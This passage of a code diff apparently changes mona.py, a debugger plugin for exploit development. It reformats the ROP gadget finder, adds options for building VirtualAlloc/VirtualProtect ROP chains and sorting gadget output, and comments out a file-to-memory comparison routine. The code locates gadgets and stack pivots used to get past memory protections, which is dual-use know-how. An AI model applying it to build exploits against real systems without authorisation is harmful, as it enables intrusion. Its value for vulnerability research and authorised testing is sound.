-    ptr_counter = 0
+	Arguments:
+	modulecriteria - dictionary with criteria modules need to comply with.
+	                 Default settings are : ignore aslr and rebased modules
+	criteria - dictionary with criteria the pointers need to comply with.
+	endings - array with all rop gadget endings to look for. Default : RETN and RETN+offsets
+	maxoffset - maximum offset value for RETN if endings are set to RETN
+	depth - maximum number of instructions to go back
+	split - Boolean that indicates whether routine should write all gadgets to one file, or split per module
+	pivotdistance - minimum distance a stackpivot needs to be
+	fast - Boolean indicating if you want to process less obvious gadgets as well
+	mode - internal use only
+	sortedprint - sort pointers before printing output to rop.txt
+	technique - create all chains if empty. otherwise, create virtualalloc or virtualprotect chain (based on what is specified)
+	
+	Return:
+	Output is written to files, containing rop gadgets, suggestions, stack pivots and virtualprotect/virtualalloc routine (if possible)
+	"""
+	
+	found_opcodes = {}
+	all_opcodes = {}
+	ptr_counter = 0
+	valid_techniques = ["virtualalloc", "virtualprotect"]
 
     modulestosearch = getModulesToQuery(modulecriteria)
     
@@ -6250,114 +6329,124 @@ def findROPGADGETS(modulecriteria={},criteria={},endings=[],maxoffset=40,depth=5
     objprogressfile = MnLog(progressfilename)
     progressfile = objprogressfile.reset()
 
-    dbg.log("[+] Progress will be written to %s" % progressfilename)
-    dbg.log("[+] Maximum offset : %d" % maxoffset)
-    dbg.log("[+] (Minimum/optional maximum) stackpivot distance : %s" % str(pivotdistance))
-    dbg.log("[+] Max nr of instructions : %d" % depth)
-    dbg.log("[+] Split output into module rop files ? %s" % split)
+	dbg.log("[+] Progress will be written to %s" % progressfilename)
+	dbg.log("[+] Maximum offset : %d" % maxoffset)
+	dbg.log("[+] (Minimum/optional maximum) stackpivot distance : %s" % str(pivotdistance))
+	dbg.log("[+] Max nr of instructions : %d" % depth)
+	dbg.log("[+] Split output into module rop files ? %s" % split)
+	#dbg.log("[+] Technique: %s" % technique)    
+	if technique != "" and technique in valid_techniques:
+		dbg.log("[+] Only creating rop chain for '%s'" % technique)
+	else:
+		dbg.log("[+] Going to create rop chains for all relevant/supported techniques: %s" % technique)
+	usefiles = False
+	filestouse = []
+	vplogtxt = ""
+	suggestions = {}
 
-    usefiles = False
-    filestouse = []
-    vplogtxt = ""
-    suggestions = {}
-    
-    if "f" in criteria:
-        if criteria["f"] <> "":
-            if type(criteria["f"]).__name__.lower() != "bool":      
-                usefiles = True
-                rawfilenames = criteria["f"].replace('"',"")
-                allfiles = rawfilenames.split(',')
-                #check if files exist
-                dbg.log("[+] Attempting to use %d rop file(s) as input" % len(allfiles))
-                for fname in allfiles:
-                    fname = fname.strip()
-                    if not os.path.exists(fname):
-                        dbg.log("     ** %s : Does not exist !" % fname, highlight=1)
-                    else:
-                        filestouse.append(fname)
-                if len(filestouse) == 0:
-                    dbg.log(" ** Unable to find any of the source files, aborting... **", highlight=1)
-                    return
-        
-    search = []
-    
-    if not usefiles:
-        if len(endings) == 0:
-            #RETN only
-            search.append("RETN")
-            for i in range(0, maxoffset + 1, 2):
-                search.append("RETN 0x"+ toHexByte(i))
-        else:
-            for ending in endings:
-                dbg.log("[+] Custom ending : %s" % ending)
-                if ending != "":
-                    search.append(ending)
-        if len(modulestosearch) == 0:
-            dbg.log("[-] No modules selected, aborting search", highlight = 1)
-            return
+	if "f" in criteria:
+		if criteria["f"] != "":
+			if type(criteria["f"]).__name__.lower() != "bool":		
+				usefiles = True
+				rawfilenames = criteria["f"].replace('"',"")
+				allfiles = [getAbsolutePath(f) for f in rawfilenames.split(',')]
+				#check if files exist
+				dbg.log("[+] Attempting to use %d rop file(s) as input" % len(allfiles))
+				for fname in allfiles:
+					fname = fname.strip()
+					if not os.path.exists(fname):
+						dbg.log("     ** %s : Does not exist !" % fname, highlight=1)
+					else:
+						filestouse.append(fname)
+				if len(filestouse) == 0:
+					dbg.log(" ** Unable to find any of the source files, aborting... **", highlight=1)
+					return
+		
+	search = []
+	
+	if not usefiles:
+		if len(endings) == 0:
+			#RETN only
+			search.append("RETN")
+			for i in range(0, maxoffset + 1, 2):
+				search.append("RETN 0x"+ toHexByte(i))
+		else:
+			for ending in endings:
+				dbg.log("[+] Custom ending : %s" % ending)
+				if ending != "":
+					search.append(ending)
+		if len(modulestosearch) == 0:
+			dbg.log("[-] No modules selected, aborting search", highlight = 1)
+			return
 
-        dbg.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
-        for thismodule in modulestosearch:
-            dbg.log("    - Querying module %s" % thismodule)
-            dbg.updateLog()
-            #search
-            found_opcodes = searchInModule(search,thismodule,criteria)
-            #merge results
-            all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
-        dbg.log("    - Search complete :")
-    else:
-        dbg.log("[+] Reading input files")
-        for filename in filestouse:
-            dbg.log("     - Reading %s" % filename)
-            all_opcodes = mergeOpcodes(all_opcodes,readGadgetsFromFile(filename))
-            
-    dbg.updateLog()
-    tp = 0
-    for endingtype in all_opcodes:
-        if len(all_opcodes[endingtype]) > 0:
-            if usefiles:
-                dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) / 2))
-                tp = tp + len(all_opcodes[endingtype]) / 2
-            else:
-                dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
-                tp = tp + len(all_opcodes[endingtype])
-    global silent
-    if not usefiles:        
-        dbg.log("    - Filtering and mutating %d gadgets" % tp)
-    else:
-        dbg.log("    - Categorizing %d gadgets" % tp)
-        silent = True
-    dbg.updateLog()
-    ropgadgets = {}
-    interestinggadgets = {}
-    stackpivots = {}
-    stackpivots_safeseh = {}
-    adcnt = 0
-    tc = 1
-    issafeseh = False
-    step = 0
-    updateth = 1000
-    if (tp >= 2000 and tp < 5000):
-        updateth = 500
-    if (tp < 2000):
-        updateth = 100
-    for endingtype in all_opcodes:
-        if len(all_opcodes[endingtype]) > 0:
-            for endingtypeptr in all_opcodes[endingtype]:
-                adcnt=adcnt+1
-                if usefiles:
-                    adcnt = adcnt - 0.5
-                if adcnt > (tc*updateth):
-                    thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
-                    updatetext = "      - Progress update : " + str(tc*updateth) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (" + str((tc*updateth*100)/tp)+"%)"
-                    objprogressfile.write(updatetext.strip(),progressfile)
-                    dbg.log(updatetext)
-                    dbg.updateLog()
-                    tc += 1             
-                if not usefiles:
-                    #first get max backward instruction
-                    thisopcode = dbg.disasmBackward(endingtypeptr,depth+1)
-                    thisptr = thisopcode.getAddress()
+		dbg.log("[+] Enumerating %d endings in %d module(s)..." % (len(search),len(modulestosearch)))
+		for thismodule in modulestosearch:
+			dbg.log("    - Querying module %s" % thismodule)
+			dbg.updateLog()
+			#search
+			found_opcodes = searchInModule(search,thismodule,criteria)
+			#merge results
+			all_opcodes = mergeOpcodes(all_opcodes,found_opcodes)
+		dbg.log("    - Search complete :")
+	else:
+		dbg.log("[+] Reading input files")
+		for filename in filestouse:
+			dbg.log("     - Reading %s" % filename)
+			all_opcodes = mergeOpcodes(all_opcodes,readGadgetsFromFile(filename))
+			
+	dbg.updateLog()
+	tp = 0
+	for endingtype in all_opcodes:
+		if len(all_opcodes[endingtype]) > 0:
+			if usefiles:
+				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype]) / 2))
+				tp = tp + len(all_opcodes[endingtype]) / 2
+			else:
+				dbg.log("       Ending : %s, Nr found : %d" % (endingtype,len(all_opcodes[endingtype])))
+				tp = tp + len(all_opcodes[endingtype])
+	global silent
+	if not usefiles:		
+		dbg.log("    - Filtering and mutating %d gadgets" % tp)
+	else:
+		dbg.log("    - Categorizing %d gadgets" % tp)
+		silent = True
+	dbg.updateLog()
+	ropgadgets = {}
+	interestinggadgets = {}
+	stackpivots = {}
+	stackpivots_safeseh = {}
+	adcnt = 0
+	tc = 1
+	issafeseh = False
+	step = 0
+	updateth = 1000
+	if (tp >= 2000 and tp < 5000):
+		updateth = 500
+	if (tp < 2000):
+		updateth = 100
+	for endingtype in all_opcodes:
+		if len(all_opcodes[endingtype]) > 0:
+			for endingtypeptr in all_opcodes[endingtype]:
+				adcnt=adcnt+1
+				if usefiles:
+					adcnt = adcnt - 0.5
+				if adcnt > (tc*updateth):
+					thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
+					updatetext = "      - Progress update : " + str(tc*updateth) + " / " + str(tp) + " items processed (" + thistimestamp + ") - (" + str((tc*updateth*100)/tp)+"%)"
+					objprogressfile.write(updatetext.strip(),progressfile)
+					dbg.log(updatetext)
+					dbg.updateLog()
+					tc += 1				
+				if not usefiles:
+					#first get max backward instruction
+					#immlib libanalyze might blow up at (self.ip=opcode[0]  # Instruction pointer), so we have to catch exceptions here
+					try:
+						thisopcode = dbg.disasmBackward(endingtypeptr,depth+1)
+						thisptr = thisopcode.getAddress()
+					except:
+						dbg.log("        ** Unable to backward disassemble at 0x%0x, depth %d, skipping location" % (endingtypeptr, depth+1))
+						thisopcode = ""
+						thisptr = 0
 
                     # we now have a range to mine
                     startptr = thisptr
@@ -6469,187 +6558,220 @@ def findROPGADGETS(modulecriteria={},criteria={},endings=[],maxoffset=40,depth=5
                     limitnr = 10
                 gcnt = 0
 
-                suggtowrite += "[%s]\n" % suggestedtype
-                for suggestedpointer in suggestions[suggestedtype]:
-                    if gcnt < limitnr:
-                        sptr = MnPointer(suggestedpointer)
-                        modname = sptr.belongsTo()
-                        modinfo = MnModule(modname)
-                        if not modinfo.moduleBase.__class__.__name__ == "instancemethod":
-                            rva = suggestedpointer - modinfo.moduleBase 
-                        suggesteddata = suggestions[suggestedtype][suggestedpointer]
-                        if not modinfo.moduleBase.__class__.__name__ == "instancemethod":
-                            ptrinfo = "0x" + toHex(suggestedpointer) + " (RVA : 0x" + toHex(rva) + ") : " + suggesteddata + "    ** [" + modname + "] **   |  " + sptr.__str__()+"\n"
-                        else:
-                            ptrinfo = "0x" + toHex(suggestedpointer) + " : " + suggesteddata + "    ** [" + modname + "] **   |  " + sptr.__str__()+"\n"
-                        suggtowrite += ptrinfo
-                    else:
-                        break
-                    gcnt += 1
-            dbg.log("[+] Launching ROP generator")
-            updatetext = "Attempting to create rop chain proposals"
-            objprogressfile.write(updatetext.strip(),progressfile)
-            vplogtxt = createRopChains(suggestions,interestinggadgets,ropgadgets,modulecriteria,criteria,objprogressfile,progressfile)
-            dbg.logLines(vplogtxt.replace("\t","    "))
-            dbg.log("    ROP generator finished")
-        else:
-            updatetext = "[+] Oops, no gadgets found, aborting.."
-            dbg.log(updatetext)
-            objprogressfile.write(updatetext.strip(),progressfile)
+				suggtowrite += "[%s]\n" % suggestedtype
+				for suggestedpointer in suggestions[suggestedtype]:
+					if gcnt < limitnr:
+						sptr = MnPointer(suggestedpointer)
+						modname = sptr.belongsTo()
+						modinfo = MnModule(modname)
+						if not modinfo.moduleBase.__class__.__name__ == "instancemethod":
+							rva = suggestedpointer - modinfo.moduleBase	
+						suggesteddata = suggestions[suggestedtype][suggestedpointer]
+						if not modinfo.moduleBase.__class__.__name__ == "instancemethod":
+							ptrinfo = "0x" + toHex(suggestedpointer) + " (RVA : 0x" + toHex(rva) + ") : " + suggesteddata + "    ** [" + modname + "] **   |  " + sptr.__str__()+"\n"
+						else:
+							ptrinfo = "0x" + toHex(suggestedpointer) + " : " + suggesteddata + "    ** [" + modname + "] **   |  " + sptr.__str__()+"\n"
+						suggtowrite += ptrinfo
+					else:
+						break
+					gcnt += 1
+			dbg.log("[+] Launching ROP generator")
+			updatetext = "Attempting to create rop chain proposals"
+			objprogressfile.write(updatetext.strip(),progressfile)
+			vplogtxt = createRopChains(suggestions,interestinggadgets,ropgadgets,modulecriteria,criteria,objprogressfile,progressfile,technique)
+			dbg.logLines(vplogtxt.replace("\t","    "))
+			dbg.log("    ROP generator finished")
+		else:
+			updatetext = "[+] Oops, no gadgets found, aborting.."
+			dbg.log(updatetext)
+			objprogressfile.write(updatetext.strip(),progressfile)
 
-    #done, write to log files
-    dbg.setStatusBar("Writing to logfiles...")
-    dbg.log("")
-    logfile = MnLog("stackpivot.txt")
-    thislog = logfile.reset()   
-    objprogressfile.write("Writing " + str(len(stackpivots)+len(stackpivots_safeseh))+" stackpivots with minimum offset " + str(pivotdistance)+" to file " + thislog,progressfile)
-    dbg.log("[+] Writing stackpivots to file " + thislog)
-    logfile.write("Stack pivots, minimum distance " + str(pivotdistance),thislog)
-    logfile.write("-------------------------------------",thislog)
-    logfile.write("Non-safeSEH protected pivots :",thislog)
-    logfile.write("------------------------------",thislog)
-    arrtowrite = "" 
-    pivotcount = 0
-    try:
-        with open(thislog,"a") as fh:
-            arrtowrite = ""
-            stackpivots_index = sorted(stackpivots) # returns sorted keys as an array
-            for sdist in stackpivots_index:
-                for spivot, schain in stackpivots[sdist]:
-                    ptrx = MnPointer(spivot)
-                    modname = ptrx.belongsTo()
-                    sdisthex = "%02x" % sdist
-                    ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
-                    pivotcount += 1
-                    arrtowrite += ptrinfo
-            fh.writelines(arrtowrite)
-    except:
-        pass
-    logfile.write("SafeSEH protected pivots :",thislog)
-    logfile.write("--------------------------",thislog) 
-    arrtowrite = "" 
-    try:
-        with open(thislog, "a") as fh:
-            arrtowrite = ""
-            stackpivots_safeseh_index = sorted(stackpivots_safeseh)
-            for sdist in stackpivots_safeseh_index:
-                for spivot, schain in stackpivots_safeseh[sdist]:
-                    ptrx = MnPointer(spivot)
-                    modname = ptrx.belongsTo()
-                    #modinfo = MnModule(modname)
-                    sdisthex = "%02x" % sdist
-                    ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
-                    pivotcount += 1
-                    arrtowrite += ptrinfo
-            fh.writelines(arrtowrite)
-    except:
-        pass    
-    dbg.log("    Wrote %d pivots to file " % pivotcount)
-    arrtowrite = ""
-    if mode == "all":
-        if len(suggestions) > 0:
-            logfile = MnLog("rop_suggestions.txt")
-            thislog = logfile.reset()
-            objprogressfile.write("Writing all suggestions to file "+thislog,progressfile)
-            dbg.log("[+] Writing suggestions to file " + thislog )
-            logfile.write("Suggestions",thislog)
-            logfile.write("-----------",thislog)
-            with open(thislog, "a") as fh:
-                fh.writelines(suggtowrite)
-                fh.write("\n")
-            nrsugg = len(suggtowrite.split("\n"))
-            dbg.log("    Wrote %d suggestions to file" % nrsugg)
+	#done, write to log files
+	dbg.setStatusBar("Writing to logfiles...")
+	dbg.log("")
+	logfile = MnLog("stackpivot.txt")
+	thislog = logfile.reset()	
+	objprogressfile.write("Writing " + str(len(stackpivots)+len(stackpivots_safeseh))+" stackpivots with minimum offset " + str(pivotdistance)+" to file " + thislog,progressfile)
+	dbg.log("[+] Writing stackpivots to file " + thislog)
+	logfile.write("Stack pivots, minimum distance " + str(pivotdistance),thislog)
+	logfile.write("-------------------------------------",thislog)
+	logfile.write("Non-SafeSEH protected pivots :",thislog)
+	logfile.write("------------------------------",thislog)
+	arrtowrite = ""	
+	pivotcount = 0
+	try:
+		with open(thislog,"a") as fh:
+			arrtowrite = ""
+			stackpivots_index = sorted(stackpivots) # returns sorted keys as an array
+			for sdist in stackpivots_index:
+				for spivot, schain in stackpivots[sdist]:
+					ptrx = MnPointer(spivot)
+					modname = ptrx.belongsTo()
+					sdisthex = "%02x" % sdist
+					ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
+					pivotcount += 1
+					arrtowrite += ptrinfo
+			fh.writelines(arrtowrite)
+	except:
+		pass
+	logfile.write("", thislog)
+	logfile.write("", thislog)
+	logfile.write("SafeSEH protected pivots :",thislog)
+	logfile.write("--------------------------",thislog)	
+	arrtowrite = ""	
+	try:
+		with open(thislog, "a") as fh:
+			arrtowrite = ""
+			stackpivots_safeseh_index = sorted(stackpivots_safeseh)
+			for sdist in stackpivots_safeseh_index:
+				for spivot, schain in stackpivots_safeseh[sdist]:
+					ptrx = MnPointer(spivot)
+					modname = ptrx.belongsTo()
+					#modinfo = MnModule(modname)
+					sdisthex = "%02x" % sdist
+					ptrinfo = "0x" + toHex(spivot) + " : {pivot " + str(sdist) + " / 0x" + sdisthex + "} : " + schain + "    ** [" + modname + "] SafeSEH **   |  " + ptrx.__str__()+"\n"
+					pivotcount += 1
+					arrtowrite += ptrinfo
+			fh.writelines(arrtowrite)
+	except:
+		pass	
+	dbg.log("    Wrote %d pivots to file " % pivotcount)
+	arrtowrite = ""
+	if mode == "all":
+		if len(suggestions) > 0:
+			logfile = MnLog("rop_suggestions.txt")
+			thislog = logfile.reset()
+			objprogressfile.write("Writing all suggestions to file "+thislog,progressfile)
+			dbg.log("[+] Writing suggestions to file " + thislog )
+			logfile.write("Suggestions",thislog)
+			logfile.write("-----------",thislog)
+			with open(thislog, "a") as fh:
+				fh.writelines(suggtowrite)
+				fh.write("\n")
+			nrsugg = len(suggtowrite.split("\n"))
+			dbg.log("    Wrote %d suggestions to file" % nrsugg)
 
-        if not split:
-            logfile = MnLog("rop.txt")
-            thislog = logfile.reset()
-            objprogressfile.write("Gathering interesting gadgets",progressfile)
-            dbg.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
-            logfile.write("Interesting gadgets",thislog)
-            logfile.write("-------------------",thislog)
-            dbg.updateLog()
-            try:
-                with open(thislog, "a") as fh:
-                    arrtowrite = ""
-                    for gadget in interestinggadgets:
-                            ptrx = MnPointer(gadget)
-                            modname = ptrx.belongsTo()
-                            #modinfo = MnModule(modname)
-                            ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
-                            arrtowrite += ptrinfo
-                    objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
-                    fh.writelines(arrtowrite)
-                dbg.log("    Wrote %d interesting gadgets to file" % len(interestinggadgets))
-            except:
-                pass
-            arrtowrite=""
-            if not fast:
-                objprogressfile.write("Enumerating other gadgets (" + str(len(ropgadgets))+")",progressfile)
-                dbg.log("[+] Writing other gadgets to file " + thislog + " (" + str(len(ropgadgets))+" gadgets)")
-                try:
-                    logfile.write("",thislog)
-                    logfile.write("Other gadgets",thislog)
-                    logfile.write("-------------",thislog)
-                    with open(thislog, "a") as fh:
-                        arrtowrite=""
-                        for gadget in ropgadgets:
-                                ptrx = MnPointer(gadget)
-                                modname = ptrx.belongsTo()
-                                #modinfo = MnModule(modname)
-                                ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
-                                arrtowrite += ptrinfo
-                        dbg.log("    Wrote %d other gadgets to file" % len(ropgadgets))
-                        objprogressfile.write("Writing results to file " + thislog + " (" + str(len(ropgadgets))+" other gadgets)",progressfile)
-                        fh.writelines(arrtowrite)
-                except:
-                    pass
-            
-        else:
-            dbg.log("[+] Writing results to individual files (grouped by module)")
-            dbg.updateLog()
-            for thismodule in modulestosearch:
-                thismodname = thismodule.replace(" ","_")
-                thismodversion = getModuleProperty(thismodule,"version")
-                logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
-                thislog = logfile.reset()
-                logfile.write("Interesting gadgets",thislog)
-                logfile.write("-------------------",thislog)
-            for gadget in interestinggadgets:
-                ptrx = MnPointer(gadget)
-                modname = ptrx.belongsTo()
-                modinfo = MnModule(modname)
-                thismodversion = getModuleProperty(modname,"version")
-                thismodname = modname.replace(" ","_")
-                logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
-                thislog = logfile.reset(False)
-                ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
-                with open(thislog, "a") as fh:
-                    fh.write(ptrinfo)
-            if not fast:
-                for thismodule in modulestosearch:
-                    thismodname = thismodule.replace(" ","_")
-                    thismodversion = getModuleProperty(thismodule,"version")
-                    logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
-                    logfile.write("Other gadgets",thislog)
-                    logfile.write("-------------",thislog)
-                for gadget in ropgadgets:
-                    ptrx = MnPointer(gadget)
-                    modname = ptrx.belongsTo()
-                    modinfo = MnModule(modname)
-                    thismodversion = getModuleProperty(modname,"version")
-                    thismodname = modname.replace(" ","_")
-                    logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
-                    thislog = logfile.reset(False)
-                    ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
-                    with open(thislog, "a") as fh:
-                        fh.write(ptrinfo)
-    thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
-    objprogressfile.write("Done (" + thistimestamp+")",progressfile)
-    dbg.log("Done")
-    return interestinggadgets,ropgadgets,suggestions,vplogtxt
-    
-    #----- JOP gadget finder ----- #
-            
+		if not split:
+			logfile = MnLog("rop.txt")
+			thislog = logfile.reset()
+			objprogressfile.write("Gathering interesting gadgets",progressfile)
+			dbg.log("[+] Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)")
+			logfile.write("Interesting gadgets",thislog)
+			logfile.write("-------------------",thislog)
+			dbg.updateLog()
+			try:
+				with open(thislog, "a") as fh:
+					arrtowrite = ""
+					if sortedprint:
+						arrptrs = []
+						dbg.log("    Sorting interesting gadgets first")
+						for gadget in interestinggadgets:
+							arrptrs.append(gadget)
+						arrptrs.sort()
+						dbg.log("    Done sorting, let's go")
+						for gadget in arrptrs:
+							ptrx = MnPointer(gadget)
+							modname = ptrx.belongsTo()
+							#modinfo = MnModule(modname)
+							ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
+							arrtowrite += ptrinfo
+
+					else:
+						for gadget in interestinggadgets:
+							ptrx = MnPointer(gadget)
+							modname = ptrx.belongsTo()
+							#modinfo = MnModule(modname)
+							ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
+							arrtowrite += ptrinfo
+					objprogressfile.write("Writing results to file " + thislog + " (" + str(len(interestinggadgets))+" interesting gadgets)",progressfile)
+					fh.writelines(arrtowrite)
+				dbg.log("    Wrote %d interesting gadgets to file" % len(interestinggadgets))
+			except:
+				pass
+			arrtowrite=""
+			if not fast:
+				objprogressfile.write("Enumerating other gadgets (" + str(len(ropgadgets))+")",progressfile)
+				dbg.log("[+] Writing other gadgets to file " + thislog + " (" + str(len(ropgadgets))+" gadgets)")
+				try:
+					logfile.write("",thislog)
+					logfile.write("Other gadgets",thislog)
+					logfile.write("-------------",thislog)
+					with open(thislog, "a") as fh:
+						arrtowrite=""
+						if sortedprint:
+							arrptrs = []
+							dbg.log("    Sorting other gadgets too")
+							for gadget in ropgadgets:
+								arrptrs.append(gadget)
+							arrptrs.sort()
+							dbg.log("    Done sorting, let's go")
+							for gadget in arrptrs:
+								ptrx = MnPointer(gadget)
+								modname = ptrx.belongsTo()
+								#modinfo = MnModule(modname)
+								ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
+								arrtowrite += ptrinfo
+						else:	
+							for gadget in ropgadgets:
+								ptrx = MnPointer(gadget)
+								modname = ptrx.belongsTo()
+								#modinfo = MnModule(modname)
+								ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** [" + modname + "] **   |  " + ptrx.__str__()+"\n"
+								arrtowrite += ptrinfo
+
+						dbg.log("    Wrote %d other gadgets to file" % len(ropgadgets))
+						objprogressfile.write("Writing results to file " + thislog + " (" + str(len(ropgadgets))+" other gadgets)",progressfile)
+						fh.writelines(arrtowrite)
+				except:
+					pass
+			
+		else:
+			dbg.log("[+] Writing results to individual files (grouped by module)")
+			dbg.updateLog()
+			for thismodule in modulestosearch:
+				thismodname = thismodule.replace(" ","_")
+				thismodversion = getModuleProperty(thismodule,"version")
+				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
+				thislog = logfile.reset()
+				logfile.write("Interesting gadgets",thislog)
+				logfile.write("-------------------",thislog)
+			for gadget in interestinggadgets:
+				ptrx = MnPointer(gadget)
+				modname = ptrx.belongsTo()
+				modinfo = MnModule(modname)
+				thismodversion = getModuleProperty(modname,"version")
+				thismodname = modname.replace(" ","_")
+				logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
+				thislog = logfile.reset(False)
+				ptrinfo = "0x" + toHex(gadget) + " : " + interestinggadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
+				with open(thislog, "a") as fh:
+					fh.write(ptrinfo)
+			if not fast:
+				for thismodule in modulestosearch:
+					thismodname = thismodule.replace(" ","_")
+					thismodversion = getModuleProperty(thismodule,"version")
+					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
+					logfile.write("Other gadgets",thislog)
+					logfile.write("-------------",thislog)
+				for gadget in ropgadgets:
+					ptrx = MnPointer(gadget)
+					modname = ptrx.belongsTo()
+					modinfo = MnModule(modname)
+					thismodversion = getModuleProperty(modname,"version")
+					thismodname = modname.replace(" ","_")
+					logfile = MnLog("rop_"+thismodname+"_"+thismodversion+".txt")
+					thislog = logfile.reset(False)
+					ptrinfo = "0x" + toHex(gadget) + " : " + ropgadgets[gadget] + "    ** " + modinfo.__str__() + " **   |  " + ptrx.__str__()+"\n"
+					with open(thislog, "a") as fh:
+						fh.write(ptrinfo)
+	thistimestamp=datetime.datetime.now().strftime("%a %Y/%m/%d %I:%M:%S %p")
+	objprogressfile.write("Done (" + thistimestamp+")",progressfile)
+	dbg.log("Done")
+	return interestinggadgets,ropgadgets,suggestions,vplogtxt
+
+	
+
+#----- JOP gadget finder ----- #			
 def findJOPGADGETS(modulecriteria={},criteria={},depth=6):
     """
     Searches for jop gadgets
@@ -7781,81 +7903,422 @@ def findPattern(modulecriteria,criteria,pattern,ptype,base,top,consecutive=False
     return allpointers
         
 
-def compareFileWithMemory(filename,startpos,skipmodules=False,findunicode=False):
-    dbg.log("[+] Reading file %s..." % filename)
-    srcdata_normal=[]
-    srcdata_unicode=[]
-    tagresults=[]
-    criteria = {}
-    criteria["accesslevel"] = "*"
-    try:
-        srcfile = open(filename,"rb")
-        content = srcfile.readlines()
-        srcfile.close()
-        for eachLine in content:
-            srcdata_normal += eachLine
-        for eachByte in srcdata_normal:
-            eachByte+=struct.pack('B', 0)
-            srcdata_unicode += eachByte
-        dbg.log("    Read %d bytes from file" % len(srcdata_normal))
-    except:
-        dbg.log("Error while reading file %s" % filename, highlight=1)
-        return
-    # loop normal and unicode
-    comparetable=dbg.createTable('mona Memory comparison results',['Address','Status','BadChars','Type','Location'])    
-    modes = ["normal", "unicode"]
-    if not findunicode:
-        modes.remove("unicode")
-    objlogfile = MnLog("compare.txt")
-    logfile = objlogfile.reset()
-    for mode in modes:
-        if mode == "normal":
-            srcdata = srcdata_normal
-        if mode == "unicode":
-            srcdata = srcdata_unicode
-        maxcnt = len(srcdata)
-        if maxcnt < 8:
-            dbg.log("Error - file does not contain enough bytes (min 8 bytes needed)",highlight=1)
-            return
-        locations = []
-        if startpos == 0:
-            dbg.log("[+] Locating all copies in memory (%s)" % mode)
-            btcnt = 0
-            cnt = 0
-            linecount = 0
-            hexstr = ""
-            hexbytes = ""
-            for eachByte in srcdata:
-                if cnt < 8:
-                    hexbytes += eachByte
-                    if len((hex(ord(srcdata[cnt]))).replace('0x',''))==1:
-                        hexchar=hex(ord(srcdata[cnt])).replace('0x', '\\x0')
-                    else:
-                        hexchar = hex(ord(srcdata[cnt])).replace('0x', '\\x')
-                    hexstr += hexchar                   
-                cnt += 1
-            dbg.log("    - searching for "+hexstr)
-            global silent
-            silent = True
-            results = findPattern({},criteria,hexstr,"bin",0,TOP_USERLAND,False)
+# def compareFileWithMemory(filename,startpos,skipmodules=False,findunicode=False):
+# 	dbg.log("[+] Reading file %s..." % filename)
+# 	srcdata_normal=[]
+# 	srcdata_unicode=[]
+# 	tagresults=[]
+# 	criteria = {}
+# 	criteria["accesslevel"] = "*"
+# 	try:
+# 		srcfile = open(filename,"rb")
+# 		content = srcfile.readlines()
+# 		srcfile.close()
+# 		for eachLine in content:
+# 			srcdata_normal += eachLine
+# 		for eachByte in srcdata_normal:
+# 			eachByte+=struct.pack('B', 0)
+# 			srcdata_unicode += eachByte
+# 		dbg.log("    Read %d bytes from file" % len(srcdata_normal))
+# 	except:
+# 		dbg.log("Error while reading file %s" % filename, highlight=1)
+# 		return
+# 	# loop normal and unicode
+# 	comparetable=dbg.createTable('mona Memory comparison results',['Address','Status','BadChars','Type','Location'])	
+# 	modes = ["normal", "unicode"]
+# 	if not findunicode:
+# 		modes.remove("unicode")
+# 	objlogfile = MnLog("compare.txt")
+# 	logfile = objlogfile.reset()
+# 	for mode in modes:
+# 		if mode == "normal":
+# 			srcdata = srcdata_normal
+# 		if mode == "unicode":
+# 			srcdata = srcdata_unicode
+# 		maxcnt = len(srcdata)
+# 		if maxcnt < 8:
+# 			dbg.log("Error - file does not contain enough bytes (min 8 bytes needed)",highlight=1)
+# 			return
+# 		locations = []
+# 		if startpos == 0:
+# 			dbg.log("[+] Locating all copies in memory (%s)" % mode)
